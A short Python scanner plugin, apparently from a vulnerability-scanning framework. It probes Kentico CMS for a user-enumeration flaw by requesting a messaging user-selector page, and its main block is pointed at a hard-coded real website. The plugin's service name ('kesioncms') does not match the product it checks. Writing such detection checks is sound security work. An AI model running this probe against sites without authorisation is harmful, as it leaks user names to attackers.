#!/usr/bin/env python
#__Refer___ = https://packetstormsecurity.com/files/125632/Kentico-CMS-7.0.75-User-Enumeration.html

import re

def assign(service, arg):
    if service == "kesioncms":
        return True, arg

def audit(arg):
    url = arg
    code, head, res, errcode, _ = curl.curl(url + 'CMSModules/Messaging/CMSPages/PublicMessageUserSelector.aspx')
    if code == 200 and '<td style="white-space:nowrap;">' in res:
       security_info("Kentico CMS user name leakage success")

if __name__ == '__main__':
    from dummy import *
    audit(assign('kesioncms', 'http://www.sqlpassnepal.org/')[1])